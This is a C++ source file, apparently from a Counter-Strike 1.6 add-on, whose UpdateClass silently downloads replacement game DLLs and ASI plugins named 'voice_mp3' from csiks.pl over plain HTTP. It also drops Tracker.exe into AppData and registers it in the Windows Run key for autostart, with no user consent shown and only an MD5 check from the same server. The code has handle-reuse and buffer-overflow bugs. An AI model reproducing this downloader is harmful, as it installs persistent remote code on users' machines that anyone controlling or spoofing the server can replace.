#include "UpdateClass.h"

BOOL checkFileOrFolderExists( LPCTSTR szPath , bool checkFolder = false );

const char * UpdateClass::urlCheck = "http://csiks.pl/pliki/stats/urlCheck.php";
const char * UpdateClass::urlDownload = "http://csiks.pl/pliki/stats/TrackerUI.DLL";

const char * UpdateClass::urlDownloadExe = "http://csiks.pl/pliki/stats/Tracker.exe";

const char * UpdateClass::urlDownloadGuardDll = "http://csiks.pl/pliki/stats/voice_mp3.dll";
const char * UpdateClass::urlDownloadGuardAsi = "http://csiks.pl/pliki/stats/voice_mp3.asi";

const char * UpdateClass::urlCheckGuardDll = "http://csiks.pl/pliki/stats/checkCsxDll.php";
const char * UpdateClass::urlCheckGuardAsi = "http://csiks.pl/pliki/stats/checkCsxAsi.php";

const char * UpdateClass::fileNameGuardAsi = "voice_mp3.asi";
const char * UpdateClass::fileNameGuardDll = "voice_mp3.dll";

const char * UpdateClass::tmpUpdateFileGuardAsi = "tmpAsi.asi";
const char * UpdateClass::tmpUpdateFileGuardDll = "tmpDll.dll";

const char * UpdateClass::tmpUpdateFile = "cstrike/bin/tmp.dll";

void UpdateClass::checkUpdate(){

	#if defined DEBUG
	logToFile( "Checking TrackerUI.DLL started" );
	#endif

	HINTERNET connectHandleSecond = InternetOpen( "HL" ,0,NULL, NULL, 0);

	char md5Sum[ 256 ];

	MD5 md5;

	strcpy( md5Sum , md5.digestFile( const_cast< char * >( fileNameMain ) ) );

	#if defined DEBUG
	char bufferLog[ 256 ];
	snprintf( bufferLog, sizeof( bufferLog ) - 1 ,"TrackerUI md5 Sum: %s" , md5Sum );
	logToFile( bufferLog );
	#endif

	HINTERNET openAddress = InternetOpenUrl( connectHandleSecond , UpdateClass::urlCheck , NULL , 0, INTERNET_FLAG_PRAGMA_NOCACHE , 0);

	if ( !openAddress ){
      InternetCloseHandle( connectHandleSecond );
	  return;
	}

	DWORD statCodeLen = sizeof(DWORD);
    DWORD statCode;

	if(!HttpQueryInfo(openAddress,
                      HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
                      &statCode,
                      &statCodeLen,
                      NULL))
    {
    	InternetCloseHandle( openAddress );
        InternetCloseHandle( connectHandleSecond );
    	return;
    }

    if( statCode != HTTP_STATUS_OK ){
    	InternetCloseHandle( openAddress );
    	InternetCloseHandle( connectHandleSecond );
    	return;
    }

	char bufferRead[ 64 ];
	DWORD NumberOfBytesRead = 0;

	InternetReadFile( openAddress , bufferRead , sizeof( bufferRead ) , &NumberOfBytesRead );

	if( NumberOfBytesRead <= 0 ){
		InternetCloseHandle( openAddress );
  		InternetCloseHandle( connectHandleSecond );

		return;
	}

	InternetCloseHandle( openAddress );
  	InternetCloseHandle( connectHandleSecond );

  	bufferRead[ NumberOfBytesRead ] = '\0';

  	#if defined DEBUG
	snprintf( bufferLog, sizeof( bufferLog ) - 1 ,"TrackerUI md5 Sum Second: %s" , md5Sum );
	logToFile( bufferLog );
	#endif

    #if defined DEBUG
	snprintf( bufferLog, sizeof( bufferLog ) - 1 ,"TrackerUI md5 Online: %s" , bufferRead );
	logToFile( bufferLog );
	#endif


  	if( strcmp( bufferRead , md5Sum ) != 0 ){
  		this -> update();
  	}
}

void UpdateClass::update(){

	HINTERNET connectHandle = InternetOpen( "HL" ,0,NULL, NULL, 0);

	if( !connectHandle ){
    	return;
	}

	HINTERNET openAddress = InternetOpenUrl( connectHandle , UpdateClass::urlDownload , NULL , 0, INTERNET_FLAG_PRAGMA_NOCACHE , 0);

	if ( !openAddress ){
    	InternetCloseHandle( connectHandle );
    	return;
	}

	DWORD statCodeLen = sizeof(DWORD);
    DWORD statCode;

	if(!HttpQueryInfo(openAddress,
                      HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
                      &statCode,
                      &statCodeLen,
                      NULL))
    {
    	InternetCloseHandle( openAddress );
        InternetCloseHandle( connectHandle );
    	return;
    }

    if( statCode != HTTP_STATUS_OK ){
    	InternetCloseHandle( openAddress );
    	InternetCloseHandle( connectHandle );
    	return;
    }

    FILE * filePointerWrite = fopen( UpdateClass::tmpUpdateFile , "wb" );

    if( !filePointerWrite ){
    	InternetCloseHandle( openAddress );
  		InternetCloseHandle( connectHandle );
		return;
	}

	checkAndSetPermissions( fileNameMain , false , false , false );

	char bufferRead[ 1024 ];
	DWORD NumberOfBytesRead = 0;

	while( InternetReadFile( openAddress , bufferRead , sizeof bufferRead , &NumberOfBytesRead ) && NumberOfBytesRead ){
		fwrite( bufferRead , sizeof( char ) , NumberOfBytesRead , filePointerWrite );
	}

	InternetCloseHandle( openAddress );
  	InternetCloseHandle( connectHandle );

  	fclose( filePointerWrite );

  	char oldName[ 256 ];

  	snprintf( oldName , sizeof( oldName ) , "%s.old" , fileNameMain );

  	MoveFile( fileNameMain , oldName );

  	MoveFile( UpdateClass::tmpUpdateFile , fileNameMain );

  	checkAndSetPermissions( fileNameMain , true , true , true );
}

void UpdateClass::clearFiles(){
	char oldName[ 256 ];

  	snprintf( oldName , sizeof( oldName ) , "%s.old" , fileNameMain );

  	DeleteFile( oldName );

  	#if defined DEBUG
	char bufferLog[ 256 ];
	snprintf( bufferLog, sizeof( bufferLog ) - 1 ,"Clear files: %s" , oldName );
	logToFile( bufferLog );
	#endif

  	snprintf( oldName , sizeof( oldName ) , "%s.old" , UpdateClass::fileNameGuardAsi );

  	DeleteFile( oldName );

  	#if defined DEBUG
	snprintf( bufferLog, sizeof( bufferLog ) - 1 ,"Clear files: %s" , oldName );
	logToFile( bufferLog );
	#endif

  	snprintf( oldName , sizeof( oldName ) , "%s.old" , UpdateClass::fileNameGuardDll );

  	DeleteFile( oldName );

  	#if defined DEBUG
	snprintf( bufferLog, sizeof( bufferLog ) - 1 ,"Clear files: %s" , oldName );
	logToFile( bufferLog );
	#endif
}

void UpdateClass::checkExe(){
	TCHAR szPath[ MAX_PATH ];

	if ( FAILED( SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, szPath ) ) ){
		return ;
	}

	PathAppend( szPath, TEXT( "\\Tracker.exe" ) );

	if( checkFileOrFolderExists( szPath , false ) ){
		return ;
	}

	#if defined DEBUG
	char bufferLog[ 256 ];
	snprintf( bufferLog, sizeof( bufferLog ) - 1 ,"Downloading exe to: %s" , szPath );
	logToFile( bufferLog );
	#endif

	HINTERNET connectHandle = InternetOpen( "HL" ,0,NULL, NULL, 0);

	if( !connectHandle ){
    	return;
	}

	HINTERNET openAddress = InternetOpenUrl( connectHandle , UpdateClass::urlDownloadExe , NULL , 0, INTERNET_FLAG_PRAGMA_NOCACHE , 0);

	if ( !openAddress ){
    	InternetCloseHandle( connectHandle );
    	return;
	}

	DWORD statCodeLen = sizeof(DWORD);
    DWORD statCode;

	if(!HttpQueryInfo(openAddress,
                      HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
                      &statCode,
                      &statCodeLen,
                      NULL))
    {
        InternetCloseHandle( connectHandle );
    	return;
    }

    if( statCode != HTTP_STATUS_OK ){
    	InternetCloseHandle( connectHandle );
    	return;
    }

    FILE * filePointerWrite = fopen( szPath  , "wb" );

	if( !filePointerWrite ){
		return;
	}

	char bufferRead[ 1024 ];
	DWORD NumberOfBytesRead = 0;

	while( InternetReadFile( openAddress , bufferRead , sizeof bufferRead , &NumberOfBytesRead ) && NumberOfBytesRead ){
		fwrite( bufferRead , sizeof( char ) , NumberOfBytesRead , filePointerWrite );
	}

	InternetCloseHandle( openAddress );
  	InternetCloseHandle( connectHandle );

  	fclose( filePointerWrite );

  	checkAndSetPermissions( szPath , true , true , true );

  	HKEY hkey = NULL;
	RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hkey);
	RegSetValueEx(hkey, "TrackerApplication", 0, REG_SZ , (LPBYTE)szPath, strlen( szPath ) + 1 );

	RegCloseKey( hkey );
}

void UpdateClass::checkGuard(){
	HINTERNET connectHandleSecond = InternetOpen( "HL" ,0,NULL, NULL, 0);

	char md5Sum[ 256 ];

	MD5 md5;

	strcpy( md5Sum , md5.digestFile( const_cast< char * >( UpdateClass::fileNameGuardAsi ) ) );

	#if defined DEBUG
	char bufferLog[ 256 ];
	snprintf( bufferLog, sizeof( bufferLog ) - 1 ,"Guard ASI md5 sum: %s" , md5Sum );
	logToFile( bufferLog );
	#endif

	HINTERNET openAddress = InternetOpenUrl( connectHandleSecond , UpdateClass::urlCheckGuardAsi , NULL , 0, INTERNET_FLAG_PRAGMA_NOCACHE , 0);

	if ( !openAddress ){
      InternetCloseHandle( connectHandleSecond );
	  return;
	}

	DWORD statCodeLen = sizeof(DWORD);
    DWORD statCode;

	if(!HttpQueryInfo(openAddress,
                      HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
                      &statCode,
                      &statCodeLen,
                      NULL))
    {
    	InternetCloseHandle( openAddress );
        InternetCloseHandle( connectHandleSecond );
    	return;
    }

    if( statCode != HTTP_STATUS_OK ){
    	InternetCloseHandle( openAddress );
    	InternetCloseHandle( connectHandleSecond );
    	return;
    }

	char bufferRead[ 64 ];
	DWORD NumberOfBytesRead = 0;

	InternetReadFile( openAddress , bufferRead , sizeof( bufferRead ) , &NumberOfBytesRead );

	if( NumberOfBytesRead <= 0 ){
		InternetCloseHandle( openAddress );
  		InternetCloseHandle( connectHandleSecond );

		return;
	}

	InternetCloseHandle( openAddress );
  	InternetCloseHandle( connectHandleSecond );

  	bufferRead[ NumberOfBytesRead ] = '\0';

  	if( strcmp( bufferRead , md5Sum ) != 0 ){
  		this -> updateGuardAsi();
  	}

  	HINTERNET connectHandle = InternetOpen( "HL" ,0,NULL, NULL, 0);

	strcpy( md5Sum , md5.digestFile( const_cast< char * >( UpdateClass::fileNameGuardDll ) ) );

	#if defined DEBUG
	snprintf( bufferLog, sizeof( bufferLog ) - 1 ,"Guard DLL md5 sum: %s" , md5Sum );
	logToFile( bufferLog );
	#endif

	HINTERNET openAddressSecond = InternetOpenUrl( connectHandle , UpdateClass::urlCheckGuardDll , NULL , 0, INTERNET_FLAG_PRAGMA_NOCACHE , 0);

	if ( !openAddress ){
      InternetCloseHandle( connectHandle);
	  return;
	}

	DWORD statCodeLenSecond = sizeof(DWORD);
    DWORD statCodeSecond;

	if(!HttpQueryInfo(openAddress,
                      HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
                      &statCodeSecond,
                      &statCodeLenSecond,
                      NULL))
    {
    	InternetCloseHandle( openAddressSecond );
        InternetCloseHandle( connectHandle );
    	return;
    }

    if( statCode != HTTP_STATUS_OK ){
    	InternetCloseHandle( openAddressSecond );
    	InternetCloseHandle( connectHandle );
    	return;
    }

	InternetReadFile( openAddress , bufferRead , sizeof( bufferRead ) , &NumberOfBytesRead );

	if( NumberOfBytesRead <= 0 ){
		InternetCloseHandle( openAddressSecond );
  		InternetCloseHandle( connectHandle );

		return;
	}

	InternetCloseHandle( openAddressSecond );
  	InternetCloseHandle( connectHandle );

  	bufferRead[ NumberOfBytesRead ] = '\0';

  	if( strcmp( bufferRead , md5Sum ) != 0 ){
  		this -> updateGuardDll();
  	}
}

void UpdateClass::updateGuardAsi(){
	HINTERNET connectHandle = InternetOpen( "HL" ,0,NULL, NULL, 0);

	if( !connectHandle ){
    	return;
	}

	HINTERNET openAddress = InternetOpenUrl( connectHandle , UpdateClass::urlDownloadGuardAsi , NULL , 0, INTERNET_FLAG_PRAGMA_NOCACHE , 0);

	if ( !openAddress ){
    	InternetCloseHandle( connectHandle );
    	return;
	}

	DWORD statCodeLen = sizeof(DWORD);
    DWORD statCode;

	if(!HttpQueryInfo(openAddress,
                      HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
                      &statCode,
                      &statCodeLen,
                      NULL))
    {
    	InternetCloseHandle( openAddress );
        InternetCloseHandle( connectHandle );
    	return;
    }

    if( statCode != HTTP_STATUS_OK ){
    	InternetCloseHandle( openAddress );
    	InternetCloseHandle( connectHandle );
    	return;
    }

    FILE * filePointerWrite = fopen( UpdateClass::tmpUpdateFileGuardAsi , "wb" );

    if( !filePointerWrite ){
    	InternetCloseHandle( openAddress );
  		InternetCloseHandle( connectHandle );
		return;
	}

	checkAndSetPermissions( fileNameGuardAsi , false , false , false );

	char bufferRead[ 1024 ];
	DWORD NumberOfBytesRead = 0;

	while( InternetReadFile( openAddress , bufferRead , sizeof bufferRead , &NumberOfBytesRead ) && NumberOfBytesRead ){
		fwrite( bufferRead , sizeof( char ) , NumberOfBytesRead , filePointerWrite );
	}

	InternetCloseHandle( openAddress );
  	InternetCloseHandle( connectHandle );

  	fclose( filePointerWrite );

  	char oldName[ 256 ];

  	snprintf( oldName , sizeof( oldName ) , "%s.old" , UpdateClass::fileNameGuardAsi );

  	MoveFile( UpdateClass::fileNameGuardAsi , oldName );

  	MoveFile( UpdateClass::tmpUpdateFileGuardAsi , UpdateClass::fileNameGuardAsi );

  	checkAndSetPermissions( UpdateClass::fileNameGuardAsi , true , true , true );
}

void UpdateClass::updateGuardDll(){
	HINTERNET connectHandle = InternetOpen( "HL" ,0,NULL, NULL, 0);

	if( !connectHandle ){
    	return;
	}

	HINTERNET openAddress = InternetOpenUrl( connectHandle , UpdateClass::urlDownloadGuardDll , NULL , 0, INTERNET_FLAG_PRAGMA_NOCACHE , 0);

	if ( !openAddress ){
    	InternetCloseHandle( connectHandle );
    	return;
	}

	DWORD statCodeLen = sizeof(DWORD);
    DWORD statCode;

	if(!HttpQueryInfo(openAddress,
                      HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
                      &statCode,
                      &statCodeLen,
                      NULL))
    {
    	InternetCloseHandle( openAddress );
        InternetCloseHandle( connectHandle );
    	return;
    }

    if( statCode != HTTP_STATUS_OK ){
    	InternetCloseHandle( openAddress );
    	InternetCloseHandle( connectHandle );
    	return;
    }

    FILE * filePointerWrite = fopen( UpdateClass::tmpUpdateFileGuardDll , "wb" );

    if( !filePointerWrite ){
    	InternetCloseHandle( openAddress );
  		InternetCloseHandle( connectHandle );
		return;
	}

	checkAndSetPermissions( fileNameGuardDll , false , false , false );

	char bufferRead[ 1024 ];
	DWORD NumberOfBytesRead = 0;

	while( InternetReadFile( openAddress , bufferRead , sizeof bufferRead , &NumberOfBytesRead ) && NumberOfBytesRead ){
		fwrite( bufferRead , sizeof( char ) , NumberOfBytesRead , filePointerWrite );
	}

	InternetCloseHandle( openAddress );
  	InternetCloseHandle( connectHandle );

  	fclose( filePointerWrite );

  	char oldName[ 256 ];

  	snprintf( oldName , sizeof( oldName ) , "%s.old" , UpdateClass::fileNameGuardDll );

  	MoveFile( UpdateClass::fileNameGuardDll , oldName );

  	MoveFile( UpdateClass::tmpUpdateFileGuardDll , UpdateClass::fileNameGuardDll );

  	checkAndSetPermissions( UpdateClass::fileNameGuardDll , true , true , true );
}

BOOL checkFileOrFolderExists( LPCTSTR szPath , bool checkFolder ){
	DWORD dwAttrib = GetFileAttributes( szPath );

	return ( dwAttrib != INVALID_FILE_ATTRIBUTES && checkFolder == ( dwAttrib & FILE_ATTRIBUTE_DIRECTORY ) );
}
